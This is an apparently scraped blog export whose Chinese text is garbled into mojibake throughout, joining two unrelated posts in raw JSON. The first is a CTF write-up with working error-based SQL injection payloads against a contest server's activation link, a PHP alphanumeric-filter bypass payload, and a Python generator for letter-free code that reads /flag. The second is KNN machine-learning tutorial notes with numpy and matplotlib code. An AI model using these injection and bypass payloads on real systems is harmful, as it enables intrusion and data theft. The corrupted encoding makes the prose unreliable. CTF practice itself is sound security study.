å…¶å®æ¯”èµ›çš„æ—¶å€™ä¸»åŠæ–¹ä¹Ÿæé†’äº†é‚®ç®±ä¸è¦éšä¾¿å¡«ï¼Œä¸è¿‡å½“æ—¶è¿˜æ˜¯æ²¡èƒ½å¯Ÿè§‰åˆ°é‚®ä»¶æ¿€æ´»é“¾æ¥ä¸­çš„ä¸€ä¸ªå‚æ•°å­˜åœ¨SQLæ³¨å…¥ã€‚ ç°åœ¨æ­£å¼è§£é¢˜ï¼Œç›´æ¥çœ‹é‚®ä»¶æ¿€æ´»é“¾æ¥ï¼š 1http:&#x2F;&#x2F;183.129.189.60:10048&#x2F;doAction.php?act&#x3D;active&amp;username&#x3D;ca01h&amp;token&#x3D;cf42313ae7812e9234d5b378f095e688 æ³¨å…¥ç‚¹åœ¨usernameå‚æ•°ï¼Œè¯´ä¸€ä¸‹æˆ‘çš„è§£é¢˜è¿‡ç¨‹ï¼š é¦–å…ˆä½¿SQLè¯­å¥æŠ¥é”™ å†å°è¯•ä¸‡èƒ½æ³¨å…¥payloadï¼š å¥½åƒå¯ä»¥ä½¿ç”¨ç›²æ³¨ï¼Œå†å°è¯•ca01h2' or if(length(select database())&gt;1, 1, 0)--+ï¼Œç»“æœç›´æ¥SQLè¯­å¥æŠ¥é”™ ç›²æ³¨ä¸è¡Œï¼Œè”åˆæ³¨å…¥è¢«è¿‡æ»¤ï¼Œé‚£ä¹ˆæ¥ç€è¯•ä¸€ä¸‹æŠ¥é”™æ³¨å…¥ï¼š æˆåŠŸçˆ†å‡ºå½“å‰ç”¨æˆ·åï¼Œæ¥ä¸‹æ¥çš„å·¥ä½œå°±æ˜¯æ‹¿æ•°æ®ã€‚ çˆ†è¡¨åï¼š 1ca01h2&#39; and (extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),0x7e)))--+ ä¸€å…±æœ‰ä¸‰ä¸ªè¡¨ï¼šstudent, teachers, users çˆ†åˆ—åï¼š 1ca01h2&#39; and (extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name&#x3D;&#39;student&#39; limit 0,1),0x7e)))--+ studentè¡¨ä¸€å…±å››ä¸ªå­—æ®µï¼šid, username, age, sex teachersè¡¨ï¼šid, f1aaaag, çˆ†æ•°æ®ï¼š 1ca01h2&#39; and (extractvalue(1,concat(0x7e,(select reverse(f1aaaag) from teachers limit 11,1),0x7e)))--+ rceme è€ƒç‚¹ æ— å­—æ¯æ•°å­—webshell è§£é¢˜ 1234567891011121314&lt;?phperror_reporting(0);show_source(__FILE__);$code=$_POST[&#x27;code&#x27;];$_=array(&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;,&#x27;d&#x27;,&#x27;e&#x27;,&#x27;f&#x27;,&#x27;g&#x27;,&#x27;h&#x27;,&#x27;i&#x27;,&#x27;j&#x27;,&#x27;k&#x27;,&#x27;m&#x27;,&#x27;n&#x27;,&#x27;l&#x27;,&#x27;o&#x27;,&#x27;p&#x27;,&#x27;q&#x27;,&#x27;r&#x27;,&#x27;s&#x27;,&#x27;t&#x27;,&#x27;u&#x27;,&#x27;v&#x27;,&#x27;w&#x27;,&#x27;x&#x27;,&#x27;y&#x27;,&#x27;z&#x27;,&#x27;@&#x27;,&#x27;\\~&#x27;,&#x27;\\^&#x27;,&#x27;\\[&#x27;,&#x27;\\]&#x27;,&#x27;\\&amp;&#x27;,&#x27;\\?&#x27;,&#x27;\\&lt;&#x27;,&#x27;\\&gt;&#x27;,&#x27;\\*&#x27;,&#x27;1&#x27;,&#x27;2&#x27;,&#x27;3&#x27;,&#x27;4&#x27;,&#x27;5&#x27;,&#x27;6&#x27;,&#x27;7&#x27;,&#x27;8&#x27;,&#x27;9&#x27;,&#x27;0&#x27;);//This blacklist is so stupid.$blacklist = array_merge($_);foreach ($blacklist as $blacklisted) &#123; if (preg_match (&#x27;/&#x27; . $blacklisted . &#x27;/im&#x27;, $code)) &#123; die(&#x27;you are not smart&#x27;); &#125;&#125;eval(&quot;echo($code)&quot;);?&gt; è¿‡æ»¤äº†æ‰€æœ‰å­—æ¯æ•°å­—å’Œéƒ¨åˆ†é€»è¾‘è¿ç®—ç¬¦ä»¥åŠå¸¸ç”¨äºæ„é€ webshellçš„^ã€~ã€&amp;ç­‰ç¬¦å·ã€‚ ä½†æ˜¯è¿˜æœ‰ä¸€ä¸ªé€»è¾‘è¿ç®—ç¬¦æ”¾å‡ºæ¥äº† |æˆ–è¿ç®—ã€‚ payloadï¼š 1code&#x3D;(&#39;&#96;&#96;&#96;&#96;&#96;&#96;&#96;&#96;&#39;|&#39;\u0012\u0005\u0001\u0004\u0006 \u0005&#39;)(&#39;&#x2F;&#96;&#96;&#96;&#96;&#39;|&#39;&#x2F;\u0006 \u0001\u0007&#39;));&#x2F;&#x2F; åº”è¯¥æ˜¯å¯ä»¥ç”¨pythonè„šæœ¬fuzzå‡ºæ¥çš„ã€‚ y1ngå¸ˆå‚…çš„æ–¹æ³•ï¼Œç›´æ¥ä¸ç”¨æˆ–è¿ç®—ç¬¦ï¼ŒTQLLLLLLï¼Œä»£ç çœ‹ä¸å¤ªæ‡‚ï¼Œè†œå°±å®Œäº‹ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879#!/usr/bin/env python3#-*- coding:utf-8 -*-#__author__: é¢–å¥‡L&#x27;Amore www.gem-love.comimport requestsfrom urllib.parse import quote_plusdef g(payload, buff): offset = 3 + buff res = &quot;&quot; base = 65 for i in range(len(payload)): if payload[i] == &#x27;_&#x27; or payload[i] == &#x27;/&#x27;: continue _ascii = ord(payload[i]) #init underline = &quot;$&quot; + (&quot;_&quot; * (i + offset)) undefined = &quot;$&quot; + (&quot;_&quot; * (len(payload) + offset + 15)) var = f&quot;++&#123;underline&#125;;$__-=&#123;underline&#125;;$__++;&#123;underline&#125;/=$__;&#123;underline&#125;=((&#123;undefined&#125;/&#123;undefined&#125;).&#123;underline&#125;)&quot;+r&quot;&#123;++$__&#125;;$__--;&quot; res += var; tmp = &#x27;&#x27; if _ascii &gt; base: for i in range(_ascii-base): tmp = tmp + f&quot;++&#123;underline&#125;;&quot; res += tmp first = &quot;$&quot; + (&quot;_&quot; * offset) for i in range(1, len(payload)): if payload[i] == &#x27;_&#x27;: res += f&quot;&#123;first&#125;.=&#x27;_&#x27;;&quot; continue if payload[i] == &#x27;/&#x27;: res += f&quot;&#123;first&#125;.=&#x27;/&#x27;;&quot; continue final_var = &quot;$&quot; + (&quot;_&quot; * (i + offset)) res += f&quot;&#123;first&#125;.=&#123;final_var&#125;;&quot; return [res, &quot;$&quot; + &quot;_&quot; * (offset)]pre = &quot;&#x27;&#x27;);&quot;after = &#x27;//&#x27;buff = len(&#x27;STRTOLOWERSHOW_SOURCE&#x27;)flag = g(&quot;/FLAG&quot;, buff)buff = len(&#x27;STRTOLOWER&#x27;)showsource = g(&quot;SHOW_SOURCE&quot;, buff)buff = 0strtolower = g(&#x27;STRTOLOWER&#x27;, buff)final = &#x27;&#x27;#1.æ„é€ STRTOLOWERå¹¶å­˜è¿›å˜é‡afinal += strtolower[0]a = strtolower[1] # a = &#x27;$___&#x27; # STRTOLOWER#2.æ„é€ SHOW_SOURCEå¹¶å­˜è¿›å˜é‡bfinal += showsource[0]b = showsource[1] # b = &#x27;$_____________&#x27; #SHOW_SOURCE#3.æ„é€ /FLAGå¹¶å­˜è¿›å˜é‡cfinal += flag[0] + flag[1] + &quot;=&#x27;/&#x27;.&quot; + flag[1] + &#x27;;&#x27;c = flag[1] # c = &#x27;$________________________&#x27; #/FLAG#å£°æ˜å¥½abcå˜é‡padding = f&#x27;$______________________________________________=&#123;a&#125;;$_______________________________________________=&#123;b&#125;;$________________________________________________=&#123;c&#125;;&#x27;final += padding# 4.å˜é‡d = a(c) åˆ™å˜é‡dä¸º/flagd = &quot;$______________________________________________($________________________________________________);&quot;padding = &#x27;$_________________________________________________=&#x27;+dfinal += padding#5. b(d) å³ä¸ºSHOW_SOURCE(&#x27;/flag&#x27;)final += &#x27;$_______________________________________________($_________________________________________________);&#x27;final = pre + finalfinal = final + afterprint(final.replace(&#x27;+&#x27;, &#x27;%2b&#x27;)) ezflask TODO Reference https://www.gem-love.com/ctf/2598.html http://phoebe233.cn/?p=248 https://rce.moe/2020/08/25/GeekPwn-2020-äº‘ä¸ŠæŒ‘æˆ˜èµ›-cosplay-writeup/","tags":[{"name":"CTF","slug":"CTF","permalink":"http://ca0y1h.top/tags/CTF/"}],"categories":[{"name":"CTF","slug":"CTF","permalink":"http://ca0y1h.top/categories/CTF/"}]},{"title":"ã€Šæœºå™¨å­¦ä¹ å®æˆ˜ã€‹ç¬”è®°â€”â€”KNN","date":"2020-09-03T11:08:29.000Z","path":"1.ã€Šæœºå™¨å­¦ä¹ å®æˆ˜ã€‹ç¬”è®°â€”â€”KNN/","text":"ã€Šæœºå™¨å­¦ä¹ å®æˆ˜ã€‹ç¬”è®°â€”â€”KNNç®—æ³• å‚è€ƒï¼šhttps://cuijiahua.com/blog/2017/11/ml_1_knn.html 0x01 ä»€ä¹ˆæ˜¯KNN kNNç®€ä»‹ kNN(k-nearest neighbor, k-NN)ï¼Œå³kè¿‘é‚»æ³•ã€‚å·¥ä½œåŸç†ï¼š å­˜åœ¨ä¸€ä¸ªæ ·æœ¬æ•°æ®é›†åˆï¼Œä¹Ÿç§°ä½œä¸ºè®­ç»ƒæ ·æœ¬é›†ï¼Œå¹¶ä¸”æ ·æœ¬é›†ä¸­æ¯ä¸ªæ•°æ®éƒ½å­˜åœ¨æ ‡ç­¾ï¼Œå³æˆ‘ä»¬çŸ¥é“æ ·æœ¬é›†ä¸­æ¯ä¸€ä¸ªæ•°æ®ä¸æ‰€å±åˆ†ç±»çš„å¯¹åº”å…³ç³»ã€‚è¾“å…¥æ²¡æœ‰æ ‡ç­¾çš„æ–°æ•°æ®åï¼Œå°†æ–°çš„æ•°æ®çš„æ¯ä¸ªç‰¹å¾ä¸æ ·æœ¬é›†ä¸­æ•°æ®å¯¹åº”çš„ç‰¹å¾è¿›è¡Œæ¯”è¾ƒï¼Œç„¶åç®—æ³•æå–æ ·æœ¬æœ€ç›¸ä¼¼æ•°æ®(æœ€è¿‘é‚»)çš„åˆ†ç±»æ ‡ç­¾ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œæˆ‘ä»¬åªé€‰æ‹©æ ·æœ¬æ•°æ®é›†ä¸­å‰kä¸ªæœ€ç›¸ä¼¼çš„æ•°æ®ï¼Œè¿™å°±æ˜¯k-è¿‘é‚»ç®—æ³•ä¸­kçš„å‡ºå¤„ï¼Œé€šå¸¸kæ˜¯ä¸å¤§äº20çš„æ•´æ•°ã€‚æœ€åï¼Œé€‰æ‹©kä¸ªæœ€ç›¸ä¼¼æ•°æ®ä¸­å‡ºç°æ¬¡æ•°æœ€å¤šçš„åˆ†ç±»ï¼Œä½œä¸ºæ–°æ•°æ®çš„åˆ†ç±»ã€‚ ä½¿ç”¨é€šä¿—æ˜“æ‡‚çš„è¯æ¥è®²å°±æ˜¯ï¼Œk-è¿‘é‚»ç®—æ³•é‡‡ç”¨æµ‹é‡ä¸åŒç‰¹å¾å€¼ä¹‹é—´çš„è·ç¦»æ–¹æ³•è¿›è¡Œåˆ†ç±»ã€‚ ä½¿ç”¨KNNç®—æ³•çš„æ­¥éª¤ï¼š è®¡ç®—å·²çŸ¥ç±»åˆ«æ•°æ®é›†ä¸­çš„ç‚¹ä¸å½“å‰ç‚¹ä¹‹é—´çš„è·ç¦»ï¼› æŒ‰ç…§è·ç¦»é€’å¢æ¬¡åºæ’åºï¼› é€‰å–ä¸å½“å‰ç‚¹è·ç¦»æœ€å°çš„kä¸ªç‚¹ï¼› ç¡®å®šå‰kä¸ªç‚¹æ‰€åœ¨ç±»åˆ«çš„å‡ºç°é¢‘ç‡ï¼› è¿”å›å‰kä¸ªç‚¹æ‰€å‡ºç°é¢‘ç‡æœ€é«˜çš„ç±»åˆ«ä½œä¸ºå½“å‰ç‚¹çš„é¢„æµ‹åˆ†ç±»ã€‚ kNNç®€å•ä¸¾ä¾‹ ä½¿ç”¨Pythonå®ç°k-è¿‘é‚»ç®—æ³•åˆ†ç±»ä¸€ä¸ªç”µå½±æ˜¯çˆ±æƒ…ç‰‡è¿˜æ˜¯åŠ¨ä½œç‰‡ã€‚ æ•°æ®é›† 123456789101112131415# -*- coding: UTF-8 -*-import numpy as npdef createDataSet(): group = np.array([[1, 101], [5, 89], [108, 5], [115, 8]]) labels = [&#x27;çˆ±æƒ…ç‰‡&#x27;, &#x27;çˆ±æƒ…ç‰‡&#x27;, &#x27;åŠ¨ä½œç‰‡&#x27;, &#x27;åŠ¨ä½œç‰‡&#x27;] return group, labelsif __name__ == &#x27;__main__&#x27;: # åˆ›å»ºæ•°æ®é›† group, labels = createDataSet() print(group) print(labels) kNNç®—æ³• å‡½æ•°classify0æ˜¯kNNç®—æ³•çš„æ ¸å¿ƒæ€æƒ³å®ç°ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546# -*- coding: UTF-8 -*-import operatorimport numpy as npdef createDataSet(): group = np.array([[1, 101], [5, 89], [108, 5], [115, 8]]) labels = [&#x27;çˆ±æƒ…ç‰‡&#x27;, &#x27;çˆ±æƒ…ç‰‡&#x27;, &#x27;åŠ¨ä½œç‰‡&#x27;, &#x27;åŠ¨ä½œç‰‡&#x27;] return group, labelsdef classify0(inX, dataSet, labels, k): # è·å–dataSizeçš„è¡Œæ•° dataSize = dataSet.shape[0] # è®¡ç®—inXä¸dataSetæ¯ä¸ªç‚¹çš„æ¨ªçºµåæ ‡çš„å·®å€¼ diffMat = np.tile(inX, (dataSize, 1)) - dataSet # å¹³æ–¹ sqDiffMat = diffMat**2 # sum()æ‰€æœ‰å…ƒç´ ç›¸åŠ ï¼Œsum(0)åˆ—ç›¸åŠ ï¼Œsum(1)è¡Œç›¸åŠ  sqDistances = sqDiffMat.sum(axis=1) # å¼€æ–¹ distances = sqDistances**0.5 # è¿”å›distancesä¸­å…ƒç´ ä»å°åˆ°å¤§æ’åºåçš„ç´¢å¼•å€¼ sortedDistIndices = distances.argsort() # è®°å½•ç±»åˆ«æ¬¡æ•°çš„å­—å…¸ classCount = &#123;&#125; for i in range(k): # å–å‡ºæ’åºåçš„ç¬¬iä¸ªçš„ç‰¹å¾ voteIlabel = labels[sortedDistIndices[i]] # è®¡ç®—ç±»åˆ«æ¬¡æ•° classCount[voteIlabel] = classCount.get(voteIlabel, 0) + 1 # æ ¹æ®å­—å…¸çš„å€¼ï¼Œå³ç±»åˆ«æ¬¡æ•°è¿›è¡Œé™åºæ’åº sortedClassCount = sorted(classCount.items(), key=operator.itemgetter(1), reverse=True) return sortedClassCount[0][0]if __name__ == &#x27;__main__&#x27;: # åˆ›å»ºæ•°æ®é›† group, labels = createDataSet() # æµ‹è¯•é›† test = [101, 20] # kNNåˆ†ç±» test_class = classify0(test, group, labels, 3) # æ‰“å°åˆ†ç±»ç»“æœ print(test_class) å…¶ä¸­ï¼Œç¬¬16è¡Œ-23è¡Œå°±æ˜¯è®¡ç®—æ¬§æ°è·ç¦»ï¼Œå…¬å¼å¦‚ä¸‹ï¼š $$ d = \\sqrt{ (q_1 - p_1)^{2} + (q_2 - p_2)^{2} + â€¦ +(q_n - p_n)^2} $$ ç¬¬26è¡Œ-32è¡Œå°±æ˜¯åœ¨è®¡ç®—labelsæ•°ç»„å‰kä¸ªæ•°æ®ä¸­æ¯ä¸ªç±»åˆ«çš„ä¸ªæ•°ã€‚ æœ€åè¿”å›ä¸ªæ•°æœ€å¤šçš„é‚£ä¸ªç±»åˆ«ã€‚ 0x02 kNNå®æˆ˜ä¹‹çº¦ä¼šç½‘ç«™é…å¯¹æ•ˆæœåˆ¤å®š ä¸€èˆ¬æµç¨‹ æ”¶é›†æ•°æ®ï¼šå¯ä»¥ä½¿ç”¨çˆ¬è™«è¿›è¡Œæ•°æ®çš„æ”¶é›†ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ç¬¬ä¸‰æ–¹æä¾›çš„å…è´¹æˆ–æ”¶è´¹çš„æ•°æ®ã€‚ä¸€èˆ¬æ¥è®²ï¼Œæ•°æ®æ”¾åœ¨txtæ–‡æœ¬æ–‡ä»¶ä¸­ï¼ŒæŒ‰ç…§ä¸€å®šçš„æ ¼å¼è¿›è¡Œå­˜å‚¨ï¼Œä¾¿äºè§£æåŠå¤„ç†ã€‚ å‡†å¤‡æ•°æ®ï¼šä½¿ç”¨Pythonè§£æã€é¢„å¤„ç†æ•°æ®ã€‚ åˆ†ææ•°æ®ï¼šå¯ä»¥ä½¿ç”¨å¾ˆå¤šæ–¹æ³•å¯¹æ•°æ®è¿›è¡Œåˆ†æï¼Œä¾‹å¦‚ä½¿ç”¨Matplotlibå°†æ•°æ®å¯è§†åŒ–ã€‚ æµ‹è¯•ç®—æ³•ï¼šè®¡ç®—é”™è¯¯ç‡ã€‚ ä½¿ç”¨ç®—æ³•ï¼šé”™è¯¯ç‡åœ¨å¯æ¥å—èŒƒå›´å†…ï¼Œå°±å¯ä»¥è¿è¡Œk-è¿‘é‚»ç®—æ³•è¿›è¡Œåˆ†ç±»ã€‚ æ•°æ®é›† æµ·ä¼¦å¥³å£«ä¸€ç›´ä½¿ç”¨åœ¨çº¿çº¦ä¼šç½‘ç«™å¯»æ‰¾é€‚åˆè‡ªå·±çš„çº¦ä¼šå¯¹è±¡ã€‚å°½ç®¡çº¦ä¼šç½‘ç«™ä¼šæ¨èä¸åŒçš„ä»»é€‰ï¼Œä½†å¥¹å¹¶ä¸æ˜¯å–œæ¬¢æ¯ä¸€ä¸ªäººã€‚ç»è¿‡ä¸€ç•ªæ€»ç»“ï¼Œå¥¹å‘ç°è‡ªå·±äº¤å¾€è¿‡çš„äººå¯ä»¥è¿›è¡Œå¦‚ä¸‹åˆ†ç±»ï¼š ä¸å–œæ¬¢çš„äºº é­…åŠ›ä¸€èˆ¬çš„äºº æå…·é­…åŠ›çš„äºº æµ·ä¼¦æ”¶é›†çº¦ä¼šæ•°æ®å·²ç»æœ‰äº†ä¸€æ®µæ—¶é—´ï¼Œå¥¹æŠŠè¿™äº›æ•°æ®å­˜æ”¾åœ¨æ–‡æœ¬æ–‡ä»¶datingTestSet.txtä¸­ï¼Œæ¯ä¸ªæ ·æœ¬æ•°æ®å æ®ä¸€è¡Œï¼Œæ€»å…±æœ‰1000è¡Œã€‚datingTestSet.txtæ•°æ®ä¸‹è½½ï¼š æ•°æ®é›†ä¸‹è½½ æµ·ä¼¦æ”¶é›†çš„æ ·æœ¬æ•°æ®ä¸»è¦åŒ…å«ä»¥ä¸‹3ç§ç‰¹å¾ï¼š æ¯å¹´è·å¾—çš„é£è¡Œå¸¸å®¢é‡Œç¨‹æ•° ç©è§†é¢‘æ¸¸æˆæ‰€æ¶ˆè€—æ—¶é—´ç™¾åˆ†æ¯” æ¯å‘¨æ¶ˆè´¹çš„å†°æ·‡æ·‹å…¬å‡æ•° éƒ¨åˆ†æ•°æ®é›†å±•ç¤ºï¼š æ•°æ®è§£æ åœ¨å°†ä¸Šè¿°ç‰¹å¾æ•°æ®è¾“å…¥åˆ°åˆ†ç±»å™¨å‰ï¼Œå¿…é¡»å°†å¾…å¤„ç†çš„æ•°æ®çš„æ ¼å¼æ”¹å˜ä¸ºåˆ†ç±»å™¨å¯ä»¥æ¥æ”¶çš„æ ¼å¼ã€‚ ä¸»è¦æ˜¯ä¸¤ä¸ªçŸ©é˜µï¼Œå³ç‰¹å¾çŸ©é˜µå’Œå¯¹åº”çš„åˆ†ç±»æ ‡ç­¾å‘é‡ã€‚é¦–å…ˆæˆ‘ä»¬å…ˆç¼–å†™å‡½æ•°file2matrixå°è¯•è§£ææ•°æ®ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738# -*- coding: UTF-8 -*-import numpy as npdef file2matrix(filename): with open(filename) as fr: # è¯»å–æ•°æ®é›† array0Lines = fr.readlines() # æ•°æ®é›†çš„è¡Œæ•°ï¼Œå³æœ‰å¤šå°‘æ¡æ•°æ® numberOfLines = len(array0Lines) # ç”ŸæˆnumberOfLinesè¡Œï¼Œ3åˆ—çš„é›¶çŸ©é˜µä½œä¸ºç‰¹å¾çŸ©é˜µçš„åˆå§‹å€¼ returnMat = np.zeros((numberOfLines, 3)) # åˆ†ç±»æ ‡ç­¾å‘é‡ classLableVector = [] index = 0 for line in array0Lines: # åˆ†å‰²æ•°æ®ï¼Œæ¯ä¸ªlistä¸€å…±æœ‰å››ä¸ªæ•°æ®ï¼Œå³ä¸‰ä¸ªç‰¹å¾å€¼å’Œä¸€ä¸ªæ ‡ç­¾ listFromLine = line.strip().split(&#x27;\\t&#x27;) # å°†å‰ä¸‰ä¸ªæ•°æ®æå–å‡ºæ¥ï¼Œå­˜æ”¾è‡³ç‰¹å¾çŸ©é˜µ returnMat[index, :] = listFromLine[0:3] # å°†æœ€åä¸€ä¸ªæ•°æ®æå–å‡ºæ¥ï¼Œå­˜æ”¾è‡³æ ‡ç­¾å‘é‡ï¼Œå¹¶è½¬æ¢ä¸ºæ•´å‹è¡¨ç¤º label = listFromLine[-1] if label == &#x27;didntLike&#x27;: classLableVector.append(1) elif label == &#x27;smallDoses&#x27;: classLableVector.append(2) elif label == &#x27;largeDoses&#x27;: classLableVector.append(3) index += 1 return returnMat, classLableVectorif __name__ == &#x27;__main__&#x27;: filename = &#x27;datingTestSet.txt&#x27; datingDataMat, datingLabels = file2matrix(filename) print(datingDataMat) print(datingLabels) è¿è¡Œç»“æœï¼š æ•°æ®å¯è§†åŒ– ç¼–å†™showdataså‡½æ•°å°†æ•°æ®å¯è§†åŒ–ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596# -*- coding: UTF-8 -*-import numpy as npfrom matplotlib.font_manager import FontPropertiesimport matplotlib.lines as mlinesimport matplotlib.pyplot as pltdef file2matrix(filename): with open(filename) as fr: # è¯»å–æ•°æ®é›† array0Lines = fr.readlines() # æ•°æ®é›†çš„è¡Œæ•°ï¼Œå³æœ‰å¤šå°‘æ¡æ•°æ® numberOfLines = len(array0Lines) # ç”ŸæˆnumberOfLinesè¡Œï¼Œ3åˆ—çš„é›¶çŸ©é˜µä½œä¸ºç‰¹å¾çŸ©é˜µçš„åˆå§‹å€¼ returnMat = np.zeros((numberOfLines, 3)) # åˆ†ç±»æ ‡ç­¾å‘é‡ classLableVector = [] index = 0 for line in array0Lines: # åˆ†å‰²æ•°æ®ï¼Œæ¯ä¸ªlistä¸€å…±æœ‰å››ä¸ªæ•°æ®ï¼Œå³ä¸‰ä¸ªç‰¹å¾å€¼å’Œä¸€ä¸ªæ ‡ç­¾ listFromLine = line.strip().split(&#x27;\\t&#x27;) # å°†å‰ä¸‰ä¸ªæ•°æ®æå–å‡ºæ¥ï¼Œå­˜æ”¾è‡³ç‰¹å¾çŸ©é˜µ returnMat[index, :] = listFromLine[0:3] # å°†æœ€åä¸€ä¸ªæ•°æ®æå–å‡ºæ¥ï¼Œå­˜æ”¾è‡³æ ‡ç­¾å‘é‡ï¼Œå¹¶è½¬æ¢ä¸ºæ•´å‹è¡¨ç¤º label = listFromLine[-1] if label == &#x27;didntLike&#x27;: classLableVector.append(1) elif label == &#x27;smallDoses&#x27;: classLableVector.append(2) elif label == &#x27;largeDoses&#x27;: classLableVector.append(3) index += 1 return returnMat, classLableVectordef showdatas(datingDataMat, datingLabels): # è®¾ç½®ä¸­æ–‡å­—ä½“æ ¼å¼ font = FontProperties(fname=r&#x27;C:\\Windows\\Fonts\\simsun.ttc&#x27;, size=14) # å°†ä¸€ä¸ªç”»å¸ƒåˆ†ä¸º4ä»½ï¼Œä¸å…±äº«xè½´å’Œyè½´ï¼Œå¤§å°ä¸º(13, 8) fig, axs = plt.subplots(nrows=2, ncols=1, sharex=False, sharey=False, figsize=(13, 8)) numberOfLabels = len(datingLabels) LabelsColor = [] for i in datingLabels: if i == 1: LabelsColor.append(&#x27;black&#x27;) if i == 2: LabelsColor.append(&#x27;orange&#x27;) if i == 3: LabelsColor.append(&#x27;red&#x27;) # ç”»å‡ºæ•£ç‚¹å›¾,ä»¥datingDataMatçŸ©é˜µçš„ç¬¬ä¸€(é£è¡Œå¸¸å®¢ä¾‹ç¨‹)ã€ç¬¬äºŒåˆ—(ç©æ¸¸æˆ)æ•°æ®ç”»æ•£ç‚¹æ•°æ®,æ•£ç‚¹å¤§å°ä¸º15,é€æ˜åº¦ä¸º0.5 axs[0][0].scatter(x=datingDataMat[:, 0], y=datingDataMat[:, 1], color=LabelsColor, s=15, alpha=.5) axs0_title_text = axs[0][0].set_title(u&#x27;æ¯å¹´è·å¾—çš„é£è¡Œå¸¸å®¢é‡Œç¨‹æ•°ä¸ç©è§†é¢‘æ¸¸æˆæ‰€æ¶ˆè€—æ—¶é—´å æ¯”&#x27;, FontProperties=font) axs0_xlabel_text = axs[0][0].set_xlabel(u&#x27;æ¯å¹´è·å¾—çš„é£è¡Œå¸¸å®¢é‡Œç¨‹æ•°&#x27;, FontProperties=font) axs0_ylabel_text = axs[0][0].set_ylabel(u&#x27;ç©è§†é¢‘æ¸¸æˆæ‰€æ¶ˆè€—æ—¶é—´å æ¯”&#x27;, FontProperties=font) plt.setp(axs0_title_text, size=9, weight=&#x27;bold&#x27;, color=&#x27;red&#x27;) plt.setp(axs0_xlabel_text, size=8, weight=&#x27;bold&#x27;, color=&#x27;black&#x27;) plt.setp(axs0_ylabel_text, size=8, weight=&#x27;bold&#x27;, color=&#x27;black&#x27;) # ç”»å‡ºæ•£ç‚¹å›¾,ä»¥datingDataMatçŸ©é˜µçš„ç¬¬ä¸€(é£è¡Œå¸¸å®¢ä¾‹ç¨‹)ã€ç¬¬ä¸‰åˆ—(å†°æ¿€å‡Œ)æ•°æ®ç”»æ•£ç‚¹æ•°æ®,æ•£ç‚¹å¤§å°ä¸º15,é€æ˜åº¦ä¸º0.5 axs[0][1].scatter(x=datingDataMat[:, 0], y=datingDataMat[:, 2], color=LabelsColor, s=15, alpha=.5) axs0_title_text = axs[0][1].set_title(u&#x27;æ¯å¹´è·å¾—çš„é£è¡Œå¸¸å®¢é‡Œç¨‹æ•°ä¸æ¯å‘¨æ¶ˆè´¹çš„å†°æ¿€æ·‹å…¬å‡æ•°&#x27;, FontProperties=font) axs0_xlabel_text = axs[0][1].set_xlabel(u&#x27;æ¯å¹´è·å¾—çš„é£è¡Œå¸¸å®¢é‡Œç¨‹æ•°&#x27;, FontProperties=font) axs0_ylabel_text = axs[0][1].set_ylabel(u&#x27;æ¯å‘¨æ¶ˆè´¹çš„å†°æ¿€æ·‹å…¬å‡æ•°&#x27;, FontProperties=font) plt.setp(axs0_title_text, size=9, weight=&#x27;bold&#x27;, color=&#x27;red&#x27;) plt.setp(axs0_xlabel_text, size=8, weight=&#x27;bold&#x27;, color=&#x27;black&#x27;) plt.setp(axs0_ylabel_text, size=8, weight=&#x27;bold&#x27;, color=&#x27;black&#x27;) # ç”»å‡ºæ•£ç‚¹å›¾,ä»¥datingDataMatçŸ©é˜µçš„ç¬¬äºŒ(ç©æ¸¸æˆ)ã€ç¬¬ä¸‰åˆ—(å†°æ¿€å‡Œ)æ•°æ®ç”»æ•£ç‚¹æ•°æ®,æ•£ç‚¹å¤§å°ä¸º15,é€æ˜åº¦ä¸º0.5 axs[1][0].scatter(x=datingDataMat[:, 1], y=datingDataMat[:, 2], color=LabelsColor, s=15, alpha=.5) axs0_title_text = axs[1][0].set_title(u&#x27;ç©è§†é¢‘æ¸¸æˆæ‰€æ¶ˆè€—æ—¶é—´å æ¯”ä¸æ¯å‘¨æ¶ˆè´¹çš„å†°æ¿€æ·‹å…¬å‡æ•°&#x27;, FontProperties=font) axs0_xlabel_text = axs[1][0].set_xlabel(u&#x27;ç©è§†é¢‘æ¸¸æˆæ‰€æ¶ˆè€—æ—¶é—´å æ¯”&#x27;, FontProperties=font) axs0_ylabel_text = axs[1][0].set_ylabel(u&#x27;æ¯å‘¨æ¶ˆè´¹çš„å†°æ¿€æ·‹å…¬å‡æ•°&#x27;, FontProperties=font) plt.setp(axs0_title_text, size=9, weight=&#x27;bold&#x27;, color=&#x27;red&#x27;) plt.setp(axs0_xlabel_text, size=8, weight=&#x27;bold&#x27;, color=&#x27;black&#x27;) plt.setp(axs0_ylabel_text, size=8, weight=&#x27;bold&#x27;, color=&#x27;black&#x27;) # è®¾ç½®å›¾ä¾‹ didntLike = mlines.Line2D([], [], color=&#x27;black&#x27;, marker=&#x27;.&#x27;, markersize=6, label=&#x27;didntLike&#x27;) smallDoses = mlines.Line2D([], [], color=&#x27;orange&#x27;, marker=&#x27;.&#x27;, markersize=6, label=&#x27;smallDoses&#x27;) largeDoses = mlines.Line2D([], [], color=&#x27;red&#x27;, marker=&#x27;.&#x27;, markersize=6, label=&#x27;largeDoses&#x27;) # æ·»åŠ å›¾ä¾‹ axs[0][0].legend(handles=[didntLike, smallDoses, largeDoses]) axs[0][1].legend(handles=[didntLike, smallDoses, largeDoses]) axs[1][0].legend(handles=[didntLike, smallDoses, largeDoses]) # æ˜¾ç¤ºå›¾ç‰‡ plt.show()if __name__ == &#x27;__main__&#x27;: filename = &#x27;datingTestSet.txt&#x27; datingDataMat, datingLabels = file2matrix(filename) showdatas(datingDataMat, datingLabels) ç»˜åˆ¶ç»“æœï¼š ä»ç¬¬ä¸€å¼ å›¾å¯ä»¥çœ‹åˆ°åˆ†ç±»æ•ˆæœæ¯”è¾ƒæ˜æ˜¾ï¼Œå¾ˆç›´è§‚çš„å‘ç°æ•°æ®çš„è§„å¾‹ã€‚ 